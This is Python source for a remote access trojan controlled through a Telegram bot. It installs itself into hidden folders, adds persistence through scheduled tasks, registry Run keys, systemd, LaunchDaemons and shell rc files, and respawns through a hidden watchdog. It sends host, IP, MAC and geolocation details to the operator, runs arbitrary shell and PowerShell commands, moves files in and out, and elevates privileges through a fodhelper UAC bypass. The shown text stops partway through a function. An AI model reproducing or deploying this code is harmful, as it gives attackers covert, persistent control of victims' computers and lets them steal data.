# -*- coding: utf-8 -*-
import functools
import asyncio,atexit,getpass,json,logging,os,platform,random,shutil,signal,socket,string,subprocess,sys,time,urllib.request,uuid
from pathlib import Path
from aiogram import Bot,Dispatcher,F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramConflictError,TelegramUnauthorizedError
from aiogram.filters import Command
from aiogram.types import ErrorEvent,Message,FSInputFile,CallbackQuery,InlineKeyboardMarkup,InlineKeyboardButton
W=sys.platform.startswith("win");M=sys.platform=="darwin";L=not W and not M
if W:
 import ctypes,winreg
 try:_k=ctypes.windll.kernel32;_k.SetConsoleOutputCP(65001);_k.SetConsoleCP(65001)
 except:pass
for _s in(sys.stdout,sys.stderr):
 try:_s.reconfigure(encoding="utf-8",errors="replace")
 except:pass
os.environ.setdefault("PYTHONIOENCODING","utf-8");os.environ.setdefault("PYTHONUTF8","1")
T=__import__("base64").b64decode("__TOKEN__").decode()
ADMINS={int(k):v for k,v in json.loads(__import__("base64").b64decode("__ADMINS__").decode()).items()}
RR={"op":1,"admin":2,"super":3}
A=int(next(k for k,v in ADMINS.items() if v=="super"))
N="__NAME__";P="__APP_NAME__";PL=f"com.{P}";MX=50*1024*1024
SP=0x08000000 if W else 0;DT=0x00000008 if W else 0;BK=0x01000000 if W else 0
b=Bot(token=T,default=DefaultBotProperties(parse_mode=ParseMode.HTML));d=Dispatcher()
logging.getLogger("aiogram").setLevel(logging.CRITICAL);logging.getLogger("asyncio").setLevel(logging.CRITICAL)
_t=time.time();_off=False;_lp=None;_sd=False;_pp=None;_gc=None;_LNAP=None
_SN={}
for _n in dir(signal):
 if _n.startswith("SIG") and not _n.startswith("SIG_"):
  try:_SN[int(getattr(signal,_n))]=_n
  except:pass
R=lambda n=10:"".join(random.choices(string.ascii_lowercase+string.digits,k=n))
E=lambda s:s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
def mo(t,l=None):return E(f"[{N}] "+(f"{l}\n" if l else ""))+f"<pre>{E(t)}</pre>"
def hd(p):
 if not W:return
 try:
  s=str(p);a=ctypes.windll.kernel32.GetFileAttributesW(s)
  if a==-1:a=0x80
  ctypes.windll.kernel32.SetFileAttributesW(s,a|0x02|0x04)
 except:pass
def wt(p,t,m=None):
 p.parent.mkdir(parents=True,exist_ok=True)
 with open(p,"w",encoding="utf-8",newline="\n")as f:f.write(t)
 if m is not None:
  try:os.chmod(p,m)
  except:pass
def oe():
 try:return f"cp{ctypes.windll.kernel32.GetOEMCP()}"
 except:return"cp866"
def dc(r):
 if not r:return""
 try:return r.decode("utf-8")
 except UnicodeDecodeError:return r.decode(oe(),errors="replace")
class C:
 def __init__(s,rc,o,e):s.returncode=rc;s.stdout=o;s.stderr=e
def rn(a,to=30):
 try:
  if W:
   q=subprocess.list2cmdline(a);r=subprocess.run(q,shell=True,capture_output=True,timeout=to,creationflags=SP)
  else:r=subprocess.run(a,capture_output=True,timeout=to)
  return C(r.returncode,dc(r.stdout or b""),dc(r.stderr or b""))
 except Exception as e:return C(-1,"",str(e))
def ad():
 try:
  if W:return bool(ctypes.windll.shell32.IsUserAnAdmin())
  return os.geteuid()==0
 except:return False
def pa(pid):
 try:
  if W:
   h=ctypes.windll.kernel32.OpenProcess(0x1000,False,pid)
   if not h:return False
   c=ctypes.c_ulong();ctypes.windll.kernel32.GetExitCodeProcess(h,ctypes.byref(c))
   ctypes.windll.kernel32.CloseHandle(h);return c.value==259
  os.kill(pid,0);return True
 except:return False
def cd():
 if W:x=os.environ.get("APPDATA")or os.path.expanduser("~")
 elif M:x=os.path.expanduser("~/Library/Application Support")
 else:x=os.environ.get("XDG_CONFIG_HOME")or os.path.expanduser("~/.config")
 return Path(x)/P
def dd():
 if W:
  if ad():return Path(os.environ.get("PROGRAMDATA",r"C:\ProgramData"))
  return Path(os.environ.get("LOCALAPPDATA")or os.environ.get("APPDATA")or os.path.expanduser("~"))
 if M:
  if ad():return Path("/Library/Application Support")
  return Path(os.path.expanduser("~/Library/Application Support"))
 if ad():return Path("/opt")
 return Path(os.environ.get("XDG_DATA_HOME")or os.path.expanduser("~/.local/share"))
def mf():return cd()/"install_path"
def cm():return cd()/".clean_exit"
def wpf():return cd()/"watchdog.pid"
def mc():
 try:cm().parent.mkdir(parents=True,exist_ok=True);cm().write_text(str(int(time.time())))
 except:pass
def cc():
 try:cm().unlink(missing_ok=True)
 except:pass
def rk(uid):
 try:return RR.get(ADMINS.get(int(uid),""),0)
 except:return 0
def req(mr):
 mrk=RR[mr]
 def dc2(fn):
  @functools.wraps(fn)
  async def wr(m,*a,**kw):
   if rk(getattr(m.from_user,"id",0))<mrk:return
   return await fn(m)
  return wr
 return dc2
def rp():
 try:
  if W:
   k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,rf"Software\{P}",0,winreg.KEY_READ);v,_=winreg.QueryValueEx(k,"LaunchPath");winreg.CloseKey(k)
  else:v=mf().read_text(encoding="utf-8").strip()
  return v if v and os.path.exists(v)else None
 except:return None
def sp(p):
 try:
  if W:
   k=winreg.CreateKey(winreg.HKEY_CURRENT_USER,rf"Software\{P}");winreg.SetValueEx(k,"LaunchPath",0,winreg.REG_SZ,p);winreg.CloseKey(k)
  else:wt(mf(),p)
 except:pass
def cp():
 try:
  if W:winreg.DeleteKey(winreg.HKEY_CURRENT_USER,rf"Software\{P}")
  else:mf().unlink(missing_ok=True)
 except:pass
def ml(f,s):
 if W:
  pw=Path(sys.executable).with_name("pythonw.exe")
  if not pw.exists():pw=Path(sys.executable)
  l=f/f"{P}.vbs"
  code=('Set fso = CreateObject("Scripting.FileSystemObject")\n'+'Set sh = CreateObject("WScript.Shell")\n'+f'p = "{f}"\n'+f'main = p & "\\{s.name}"\n'+'bak = p & "\\.bak"\n'+'If Not fso.FileExists(main) Then\n'+'  If fso.FileExists(bak) Then fso.CopyFile bak, main\n'+'End If\n'+f'sh.Run """{pw}"" """ & main & """", 0, False\n')
  wt(l,code);hd(l)
 else:
  l=f/f"{P}.sh"
  code=('#!/bin/sh\n'+f'd="{f}"\n'+f'[ -f "$d/{s.name}" ] || cp "$d/.bak" "$d/{s.name}" 2>/dev/null\n'+f'exec "{sys.executable}" "$d/{s.name}" "$@"\n')
  wt(l,code,m=0o755)
 return l
def isf():
 s=rp()
 if s:return s
 try:
  fr=getattr(sys,"frozen",False);src=Path(sys.executable if fr else __file__).resolve()
  e=".exe" if fr and W else(""if fr else".py")
  base=dd();f=base/f".{R()}"
  try:f.mkdir(parents=True,exist_ok=True)
  except:f=Path.home()/f".{R()}";f.mkdir(parents=True,exist_ok=True)
  hd(f);dst=f/f"{P}{e}"
  if src.resolve()!=dst.resolve():shutil.copy2(src,dst)
  hd(dst)
  try:shutil.copy2(dst,f/".bak");hd(f/".bak")
  except:pass
  try:
   b2=base/f".{R()}";b2.mkdir(parents=True,exist_ok=True);hd(b2)
   shutil.copy2(dst,b2/dst.name);hd(b2/dst.name)
  except:pass
  if not fr and not W:
   try:os.chmod(dst,0o755)
   except:pass
  l=dst if fr else ml(f,dst);sp(str(l));return str(l)
 except:return str(Path(sys.executable if getattr(sys,"frozen",False)else __file__).resolve())
def aw(t):
 r=[]
 if ad():
  tr=f'"{t}"'if" "in t else t
  for sc in("ONLOGON","ONSTART","ONIDLE"):
   x=rn(["schtasks","/Create","/TN",f"{P}_{sc}","/TR",tr,"/SC",sc,"/RL","HIGHEST","/RU","SYSTEM","/F"])
   if x.returncode==0:r.append(f"task/{sc}")
  try:
   sf=Path(os.environ.get("PROGRAMDATA",r"C:\ProgramData"))/"Microsoft"/"Windows"/"Start Menu"/"Programs"/"StartUp"
   sf.mkdir(parents=True,exist_ok=True);wt(sf/f"{P}.cmd",f'@start "" "{t}"\n');hd(sf/f"{P}.cmd");r.append("startup-all")
  except:pass
 try:
  for sub in("Run","RunOnce"):
   k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,rf"Software\Microsoft\Windows\CurrentVersion\{sub}",0,winreg.KEY_SET_VALUE)
   winreg.SetValueEx(k,P,0,winreg.REG_SZ,t);winreg.CloseKey(k)
  r.append("hkcu")
 except:pass
 try:
  sf=Path(os.path.expanduser("~"))/"AppData"/"Roaming"/"Microsoft"/"Windows"/"Start Menu"/"Programs"/"Startup"
  sf.mkdir(parents=True,exist_ok=True);wt(sf/f"{P}.cmd",f'@start "" "{t}"\n');hd(sf/f"{P}.cmd");r.append("startup-user")
 except:pass
 return "✅ "+", ".join(r) if r else "⚠️ no persistence"
def al(t):
 r=[]
 if ad():
  u="[Unit]\n"+f"Description={P}\n"+"After=network-online.target\nWants=network-online.target\n\n[Service]\nType=simple\n"+f"ExecStart={t}\n"+"Restart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n"
  up=Path(f"/etc/systemd/system/{P}.service")
  try:
   wt(up,u,m=0o644);rn(["systemctl","daemon-reload"]);rn(["systemctl","enable","--now",f"{P}.service"]);r.append("systemd")
  except:pass
 adir=Path(os.environ.get("XDG_CONFIG_HOME")or os.path.expanduser("~/.config"))/"autostart"
 x="[Desktop Entry]\nType=Application\n"+f"Name={P}\nExec={t}\nTerminal=false\nX-GNOME-Autostart-enabled=true\n"
 try:
  wt(adir/f"{P}.desktop",x,m=0o644);r.append("xdg")
 except:pass
 try:
  mark=f"# {P}-autostart"
  line=f'\n{mark}\n(exec "{t}" >/dev/null 2>&1 &) 2>/dev/null\n'
  for rc in(Path.home()/".bashrc",Path.home()/".profile",Path.home()/".zshrc",Path.home()/".bash_profile"):
   try:
    if rc.exists() and mark not in rc.read_text(errors="replace"):
     with open(rc,"a")as f2:f2.write(line)
   except:pass
  r.append("shellrc")
 except:pass
 return "✅ "+", ".join(r) if r else "⚠️ no persistence"
def am(t):
 pl='<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n'+f'  <key>Label</key><string>{PL}</string>\n  <key>ProgramArguments</key>\n  <array><string>{t}</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n</dict>\n</plist>\n'
 pd=Path("/Library/LaunchDaemons")if ad()else Path(os.path.expanduser("~/Library/LaunchAgents"))
 pp=pd/f"{PL}.plist";r=[]
 try:
  wt(pp,pl,m=0o644);rn(["launchctl","unload",str(pp)]);x=rn(["launchctl","load","-w",str(pp)])
  if x.returncode==0:r.append("launchd")
 except:pass
 try:
  mark=f"# {P}-autostart"
  line=f'\n{mark}\n(exec "{t}" >/dev/null 2>&1 &) 2>/dev/null\n'
  rc=Path.home()/".zshrc"
  if rc.exists() and mark not in rc.read_text(errors="replace"):
   with open(rc,"a")as f2:f2.write(line)
  r.append("zshrc")
 except:pass
 return "✅ "+", ".join(r) if r else "⚠️ no persistence"
def ai():
 try:
  t=isf()
  if W:return aw(t)
  if M:return am(t)
  return al(t)
 except Exception as e:return f"⚠️ install err: {e}"
def _cln_shellrc():
 try:
  mark=f"# {P}-autostart"
  for rc in(Path.home()/".bashrc",Path.home()/".profile",Path.home()/".zshrc",Path.home()/".bash_profile"):
   try:
    if rc.exists():
     txt=rc.read_text(errors="replace")
     lines=[l for l in txt.split("\n")if mark not in l and l.strip()!=(f'(exec "{_LNAP}" >/dev/null 2>&1 &) 2>/dev/null' if _LNAP else "")]
     rc.write_text("\n".join(lines))
   except:pass
 except:pass
def ua():
 try:
  if W:
   for sc in("ONLOGON","ONSTART","ONIDLE"):rn(["schtasks","/Delete","/TN",f"{P}_{sc}","/F"])
   rn(["schtasks","/Delete","/TN",P,"/F"])
   for hive in("HKCU","HKLM"):
    for sub in("Run","RunOnce"):
     rn(["reg","delete",rf"{hive}\Software\Microsoft\Windows\CurrentVersion\{sub}","/v",P,"/f"])
   rn(["reg","delete",rf"HKCU\Software\{P}","/f"]);rn(["reg","delete",rf"HKLM\Software\{P}","/f"])
   for sf in(Path(os.environ.get("PROGRAMDATA",r"C:\ProgramData"))/"Microsoft"/"Windows"/"Start Menu"/"Programs"/"StartUp",Path(os.path.expanduser("~"))/"AppData"/"Roaming"/"Microsoft"/"Windows"/"Start Menu"/"Programs"/"Startup"):
    try:(sf/f"{P}.cmd").unlink(missing_ok=True)
    except:pass
  elif M:
   for p in(Path(f"/Library/LaunchDaemons/{PL}.plist"),Path(os.path.expanduser(f"~/Library/LaunchAgents/{PL}.plist"))):
    rn(["launchctl","unload","-w",str(p)])
    try:p.unlink(missing_ok=True)
    except:pass
   _cln_shellrc()
  else:
   rn(["systemctl","disable","--now",f"{P}.service"])
   try:Path(f"/etc/systemd/system/{P}.service").unlink(missing_ok=True)
   except:pass
   rn(["systemctl","daemon-reload"])
   for p in(Path(f"/etc/systemd/system/{P}.service"),Path(os.environ.get("XDG_CONFIG_HOME")or os.path.expanduser("~/.config"))/"autostart"/f"{P}.desktop"):
    try:p.unlink(missing_ok=True)
    except:pass
   _cln_shellrc()
 except:pass
def sd():
 try:
  pf=wpf()
  if pf.exists():
   try:
    pid=int(pf.read_text().strip())
    if W:
     h=ctypes.windll.kernel32.OpenProcess(0x0001,False,pid)
     if h:ctypes.windll.kernel32.TerminateProcess(h,0);ctypes.windll.kernel32.CloseHandle(h)
    else:os.kill(pid,signal.SIGKILL)
   except:pass
   pf.unlink(missing_ok=True)
 except:pass
 ua();cp();mc()
 l=rp()
 try:
  c=Path(sys.executable if getattr(sys,"frozen",False)else __file__).resolve();f=str(c.parent)
 except:f=None
 try:f=f or(str(Path(l).parent)if l else None)
 except:f=None
 if f:
  try:
   if W:subprocess.Popen(f'timeout /t 2 /nobreak >nul & attrib -h -s -r "{f}" /s /d & rmdir /s /q "{f}"',shell=True,creationflags=SP|DT,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
   else:subprocess.Popen(f'sleep 2 && rm -rf "{f}"',shell=True,start_new_session=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
  except:pass
 os._exit(0)
def fl(c):
 if not c or len(c)!=2:return"🏳️"
 try:return"".join(chr(0x1F1E6+ord(x.upper())-65)for x in c)
 except:return"🏳️"
def gl():
 global _gc
 if _gc is not None:return _gc
 for u,k in[("https://ipwho.is/",("ip","country_code","country","city","latitude","longitude")),("https://ipapi.co/json/",("ip","country_code","country_name","city","latitude","longitude")),("https://freeipapi.com/api/json",("ipAddress","countryCode","countryName","cityName","latitude","longitude")),("https://get.geojs.io/v1/ip/geo.json",("ip","country_code","country","city","latitude","longitude")),("https://api.ip.sb/geoip",("ip","country_code","country","city","latitude","longitude")),("http://ipwhois.app/json/",("ip","country_code","country","city","latitude","longitude")),("http://ip-api.com/json/",("query","countryCode","country","city","lat","lon")),("https://ipinfo.io/json",("ip","country","country","city",None,None)),("https://api.myip.com",("ip","cc","country",None,None,None))]:
  try:
   with urllib.request.urlopen(u,timeout=6)as r:x=json.loads(r.read().decode("utf-8",errors="replace"))
   i=x.get(k[0])
   if not i:continue
   _gc={"ip":i,"cc":x.get(k[1])or"","country":x.get(k[2])or"?","city":x.get(k[3])or"?","lat":x.get(k[4])if k[4]else None,"lon":x.get(k[5])if k[5]else None}
   return _gc
  except:pass
 _gc={}
 return _gc
def gL():
 x=gl()
 if not x or not x.get("ip"):return"unknown"
 c=f" ({x['lat']}, {x['lon']} - GeoIP)"if x.get("lat")is not None and x.get("lon")is not None else""
 return f"{fl(x.get('cc',''))} {x.get('country','?')}, {x.get('city','?')}{c}"
def gp():return gl().get("ip")or"unknown"
def gi():
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));i=s.getsockname()[0];s.close();return i
 except:return"unknown"
def gm():
 try:
  n=uuid.getnode();h=f"{n:012X}";return f"{h} ({':'.join(h[i:i+2]for i in(0,2,4,6,8,10))})"
 except:return"unknown"
def gd():
 try:u=getpass.getuser()
 except:u="unknown"
 try:return"\n".join([f"🖥 Host: {platform.node()}",f"👤 User: {u}",f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",f"🏗 Architecture: {platform.machine()}",f"🌐 Local IP: {gi()}",f"🌍 Public IP: {gp()}",f"🔗 MAC: {gm()}",f"📁 CWD: {os.getcwd()}",f"📂 Installed: {rp()or'❌'}",f"🛡 Admin: {ad()}",f"👥 Admins: {len(ADMINS)}",f"🐧 Platform: {'win' if W else 'mac' if M else 'linux'}",f"\n",f"Type /help to see command list."])
 except Exception as e:return f"[device info error: {e}]"
async def bo():
 try:g=await asyncio.to_thread(gL)
 except Exception as e:g=f"[geo err: {e}]"
 try:i=await asyncio.to_thread(gd)
 except Exception as e:i=f"[info err: {e}]"
 return mo(f"🟢 ONLINE!\n\n{g}\n\n{i}")
def rc(c):
 try:
  r=subprocess.run(c,shell=True,capture_output=True,creationflags=SP if W else 0);o=dc((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
 except Exception as e:return f"[error: {e}]"
def rcc(c):
 try:
  if W:r=subprocess.run(["cmd.exe","/c",c],capture_output=True,creationflags=SP)
  else:r=subprocess.run(c,shell=True,capture_output=True)
  o=dc((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
 except Exception as e:return f"[error: {e}]"
def rcp(c):
 if not W:return"[powershell] only supported on Windows"
 try:
  r=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",c],capture_output=True,creationflags=SP);o=dc((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
 except Exception as e:return f"[error: {e}]"
def ub(cmd,ln="fodhelper.exe"):
 if not W:return"[uac] windows only"
 key=r"HKCU\Software\Classes\ms-settings\shell\open\command"
 r1=rn(["reg","add",key,"/ve","/t","REG_SZ","/d",cmd,"/f"])
 if r1.returncode!=0:return f"[uac] r1: {r1.stderr or r1.stdout}"
 r2=rn(["reg","add",key,"/v","DelegateExecute","/t","REG_SZ","/d","","/f"])
 if r2.returncode!=0:return f"[uac] r2: {r2.stderr or r2.stdout}"
 try:subprocess.Popen(ln,shell=True,creationflags=SP)
 except Exception as e:return f"[uac] launch: {e}"
 time.sleep(2.0)
 rn(["reg","delete",r"HKCU\Software\Classes\ms-settings","/f"])
 return "attempted"
def sm(t,l=3500):
 for i in range(0,len(t),l):yield t[i:i+l]
def ia(m):
 try:return bool(m.from_user and rk(m.from_user.id)>=1)
 except:return False
async def ss(t):
 try:await b.send_message(A,t)
 except:pass
async def se(t):
 mc();await ss(t);await asyncio.sleep(0.3);os._exit(0)
def sg(s,f):
 global _sd
 if _sd:return
 _sd=True;mc()
 nm=_SN.get(s,str(s))
 try:
  if _lp and not _lp.is_closed():
   asyncio.run_coroutine_threadsafe(se(f"⚠️ [{N}] shutting down ({nm})"),_lp);return
 except:pass
 os._exit(0)
def ex():
 global _sd
 if _sd:return
 _sd=True;mc()
 try:asyncio.run(ss(mo("⚠️ process exiting (atexit)")))
 except:pass
atexit.register(ex)
_AS=[signal.SIGINT,signal.SIGTERM]
if not W:
 for _e in("SIGHUP","SIGQUIT","SIGABRT","SIGUSR1","SIGUSR2","SIGPIPE","SIGALRM"):
  _x=getattr(signal,_e,None)
  if _x is not None:_AS.append(_x)
else:
 _x=getattr(signal,"SIGBREAK",None)
 if _x is not None:_AS.append(_x)
for _s in _AS:
 try:signal.signal(_s,sg)
 except:pass
if W:
 _CN={0:"CTRL_C_EVENT",1:"CTRL_BREAK_EVENT",2:"CTRL_CLOSE_EVENT",5:"CTRL_LOGOFF_EVENT",6:"CTRL_SHUTDOWN_EVENT"}
 _CT=ctypes.WINFUNCTYPE(ctypes.c_bool,ctypes.c_uint)
 @_CT
 def _ch(ct):
  global _sd
  mc()
  if _sd:return False
  _sd=True
  nm=_CN.get(ct,str(ct))
  try:
   if _lp and not _lp.is_closed():
    asyncio.run_coroutine_threadsafe(se(f"⚠️ [{N}] console event: {nm}"),_lp)
    if ct in (2,5,6):time.sleep(2.5)
  except:pass
  return False
 try:ctypes.windll.kernel32.SetConsoleCtrlHandler(_ch,True)
 except:pass
def wd():
 if getattr(sys,"frozen",False):return
 try:
  x=sys.executable
  if not x:return
  p=os.getpid();mk=str(cm());ins=rp()or""
  wd_=None
  if ins:
   try:wd_=Path(ins).parent
   except:wd_=None
  if not wd_ or not wd_.exists():wd_=dd()
  try:wd_.mkdir(parents=True,exist_ok=True)
  except:wd_=Path.home()
  wf=wd_/f".wd_{R(8)}.py"
  pf=str(wpf())
  wc=("import os,sys,time,platform,urllib.request,urllib.parse,subprocess\n"+f"PID={p}\n"+f"TOKEN={T!r}\n"+f"ADMIN={A}\n"+f"NAME={N!r}\n"+f"MARKER={mk!r}\n"+f"LAUNCHER={ins!r}\n"+f"PIDFILE={pf!r}\n"+"def alive(pid):\n"+"    try:\n"+"        if platform.system()=='Windows':\n"+"            import ctypes\n"+"            h=ctypes.windll.kernel32.OpenProcess(0x1000,False,pid)\n"+"            if not h:return False\n"+"            c=ctypes.c_ulong()\n"+"            ctypes.windll.kernel32.GetExitCodeProcess(h,ctypes.byref(c))\n"+"            ctypes.windll.kernel32.CloseHandle(h)\n"+"            return c.value==259\n"+"        os.kill(pid,0);return True\n"+"    except:return False\n"+"def notify(txt):\n"+"    try:\n"+"        data=urllib.parse.urlencode({'chat_id':ADMIN,'text':txt}).encode()\n"+"        urllib.request.urlopen(f'https://api.telegram.org/bot{TOKEN}/sendMessage',data,timeout=10)\n"+"    except:pass\n"+"def nrate(txt):\n"+"    try:\n"+"        f=os.path.join(os.path.dirname(MARKER)or'.','.notify_ts')\n"+"        try:last=float(open(f).read().strip()or 0)\n"+"        except:last=0\n"+"        if time.time()-last>300:\n"+"            notify(txt)\n"+"            try:open(f,'w').write(str(int(time.time())))\n"+"            except:pass\n"+"    except:pass\n"+"def respawn():\n"+"    if not LAUNCHER or not os.path.exists(LAUNCHER):\n"+"        return False\n"+"    try:\n"+"        if platform.system()=='Windows':\n"+"            fl=0x08000000|0x00000008|0x01000000\n"+"            subprocess.Popen(f'\"{LAUNCHER}\"',shell=True,creationflags=fl,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)\n"+"        else:\n"+"            subprocess.Popen([LAUNCHER],start_new_session=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)\n"+"        return True\n"+"    except:return False\n"+"try:open(PIDFILE,'w').write(str(os.getpid()))\n"+"except:pass\n"+"while True:\n"+"    while alive(PID):time.sleep(2)\n"+"    time.sleep(1)\n"+"    if os.path.exists(MARKER):\n"+"        try:os.unlink(MARKER)\n"+"        except:pass\n"+"        try:os.unlink(PIDFILE)\n"+"        except:pass\n"+"        try:os.unlink(__file__)\n"+"        except:pass\n"+"        sys.exit(0)\n"+"    nrate(f'\\U0001F534 [{NAME}] died - respawning')\n"+"    if not respawn():\n"+"        nrate(f'\\u26A0\\ufe0F [{NAME}] respawn failed')\n"+"    for _ in range(60):\n"+"        if os.path.exists(MARKER):break\n"+"        time.sleep(1)\n"+"    sys.exit(0)\n")
  wt(wf,wc);hd(wf)
  bf=0
  if W:bf=subprocess.DETACHED_PROCESS|subprocess.CREATE_NEW_PROCESS_GROUP
  a=[x,str(wf)];k=dict(stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,close_fds=True)
  try:
   if W:subprocess.Popen(a,creationflags=bf|BK,**k)
   else:subprocess.Popen(a,start_new_session=True,**k)
  except OSError:
   try:
    if W:subprocess.Popen(a,creationflags=bf,**k)
    else:subprocess.Popen(a,start_new_session=True,**k)
   except:pass
 except:pass
async def wcl():
 while True:
  try:
   l=rp()
   if l and not Path(l).exists():
    try:await asyncio.to_thread(ai)
    except:pass
   pf=wpf()
   if pf.exists():
    try:
     pid=int(pf.read_text().strip())
     if not pa(pid):
      pf.unlink(missing_ok=True);wd()
    except:wd()
   else:wd()
  except:pass
  await asyncio.sleep(60)
@d.errors()
async def _e(e):
 try:
  import traceback
  print("HANDLER ERROR:","".join(traceback.format_exception(type(e.exception),e.exception,e.exception.__traceback__)))
 except:pass
 return True
@d.message(Command("start"))
async def c1(m):
 try:
  if not ia(m):return
  await m.answer(await bo())
 except:pass
@d.message(Command("help"))
async def c2(m):
 try:
  if not ia(m):return
  r=ADMINS.get(m.from_user.id,"?")if m.from_user else"?"
  await m.answer(mo(f"📖 commands (your role: {r})\n\n/start — host info + geo\n/heartbeat — liveness probe\n/help — this message\n/admins — list admins\n/uninstall — self-destruct (admin)\n/getfile <path> — download file (admin)\n/putfile <dir> — upload file into dir (admin)\n/cmd <command> — cmd.exe / sh (admin)\n/powershell <command> — PowerShell (admin, Win)\n/uac <command> — high-integrity via UAC bypass (admin, Win)\n\nanything else — shell command (admin)\n\nlimits:\n  • max upload: {MX//(1024*1024)} MB per file"))
 except:pass
@d.message(Command("admins"))
async def c3(m):
 try:
  if not ia(m):return
  ls=[]
  for uid,role in sorted(ADMINS.items(),key=lambda x:-RR[x[1]]):
   mark="⭐"if role=="super"else"🛡"if role=="admin"else"👁"
   ls.append(f"{mark} {role:5s}  {uid}")
  await m.answer(mo("admins:\n\n"+"\n".join(ls)))
 except:pass
@d.message(Command("uninstall"))
@req("admin")
async def c6(m):
 try:
  if not ia(m):return
  k=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Yes",callback_data="u:y"),InlineKeyboardButton(text="❌ No",callback_data="u:n")]])
  await m.answer(mo("⚠️ are you sure?\n\nThis will remove autostart entries, install folder and this process."),reply_markup=k)
 except:pass
@d.callback_query(F.data.startswith("u:"))
async def c7(q):
 try:
  if not q.from_user or rk(q.from_user.id)<RR["admin"]:return
  a=q.data.split(":",1)[1]
  if a=="y":
   try:await q.message.edit_text(mo("🗑 uninstalling..."))
   except:pass
   await asyncio.sleep(0.4);mc();await ss(mo("🗑 uninstalling and self-destructing"));await asyncio.sleep(0.6);await asyncio.to_thread(sd)
  else:
   try:await q.message.edit_text(mo("❌ cancelled"))
   except:pass
 except:pass
@d.message(Command("getfile"))
@req("admin")
async def c8(m):
 try:
  if not ia(m):return
  x=(m.text or"").strip().split(maxsplit=1)
  if len(x)<2 or not x[1].strip():return await m.answer(mo("usage: /getfile <path>"))
  p=Path(x[1].strip().strip('"').strip("'"))
  if not p.exists():return await m.answer(mo(f"❌ not found: {p}"))
  if p.is_dir():return await m.answer(mo(f"❌ is a directory: {p}"))
  try:s=p.stat().st_size
  except Exception as e:return await m.answer(mo(f"❌ cannot stat: {e}"))
  if s==0:return await m.answer(mo(f"❌ empty file: {p}"))
  if s>MX:return await m.answer(mo(f"❌ file too large: {s/1024/1024:.1f} MB (limit {MX//(1024*1024)} MB)"))
  try:
   F_=FSInputFile(str(p),filename=p.name);await m.answer_document(F_,caption=f"[{N}] {p}",parse_mode=None)
  except Exception as e:
   try:await m.answer(mo(f"❌ upload failed: {e}"))
   except:pass
 except:pass
@d.message(Command("putfile"))
@req("admin")
async def c9(m):
 global _pp
 try:
  if not ia(m):return
  x=(m.text or"").strip().split(maxsplit=1)
  if len(x)<2 or not x[1].strip():return await m.answer(mo("usage: /putfile <target_directory>"))
  p=Path(x[1].strip().strip('"').strip("'"))
  if not p.exists():return await m.answer(mo(f"❌ directory not found: {p}"))
  if not p.is_dir():return await m.answer(mo(f"❌ not a directory: {p}"))
  _pp=str(p);await m.answer(mo(f"📤 send me the file to save into:\n{p}\n\n(send as a document, not as a photo)"))
 except:pass
@d.message(F.document)
async def cA(m):
 global _pp
 try:
  if not ia(m):return
  if not _pp:return
  p=Path(_pp);_pp=None
  fn=(m.document.file_name or"").replace("\\","/");fn=os.path.basename(fn)or f"upload_{R(8)}";dst=p/fn
  try:await b.download(m.document,destination=dst)
  except Exception as e:return await m.answer(mo(f"❌ download failed: {e}"))
  try:s=dst.stat().st_size
  except:s=0
  await m.answer(mo(f"✅ saved: {dst}\n📦 {s} bytes"))
 except Exception as e:
  try:await m.answer(mo(f"❌ putfile err: {e}"))
  except:pass
@d.message(Command("heartbeat"))
async def cB(m):
 try:
  if not ia(m):return
  u=int(time.time()-_t);h,r=divmod(u,3600);mn,sc=divmod(r,60)
  await m.answer(mo(f"💓 alive\n⏱ uptime: {h}h {mn}m {sc}s\n🆔 pid: {os.getpid()}\n📡 offline flag: {_off}\n🛡 admin: {ad()}\n🐧 platform: {'win' if W else 'mac' if M else 'linux'}"))
 except:pass
@d.message(Command("cmd"))
@req("admin")
async def cC(m):
 try:
  if not ia(m):return
  x=(m.text or"").strip().split(maxsplit=1)
  if len(x)<2 or not x[1].strip():return await m.answer(mo("usage: /cmd <command>"))
  o=await asyncio.to_thread(rcc,x[1].strip())
  for c in sm(o):
   try:await m.answer(mo(c))
   except:pass
 except:pass
@d.message(Command("powershell"))
@req("admin")
async def cD(m):
 try:
  if not ia(m):return
  x=(m.text or"").strip().split(maxsplit=1)
  if len(x)<2 or not x[1].strip():return await m.answer(mo("usage: /powershell <command>"))
  o=await asyncio.to_thread(rcp,x[1].strip())
  for c in sm(o):
   try:await m.answer(mo(c))
   except:pass
 except:pass
@d.message(Command("uac"))
@req("admin")
async def cE(m):
 try:
  if not ia(m):return
  x=(m.text or"").strip().split(maxsplit=1)
  if len(x)<2 or not x[1].strip():return await m.answer(mo("usage: /uac <command>\nexample: /uac whoami /groups"))
  cmd=x[1].strip()
  if not ad():return await m.answer(mo("❌ not an admin. UAC bypass only elevates a filtered admin token to high; it does not grant admin rights."))
  tmp=Path(os.environ.get("TEMP",r"C:\Windows\Temp"))/f"uac_{R(8)}.txt"
  wrapped=f'cmd.exe /c ({cmd}) > "{tmp}" 2>&1'
  await m.answer(mo(f"attempting uac bypass…\npayload: {cmd}"))
  res=await asyncio.to_thread(ub,wrapped)
  cap=""
  try:
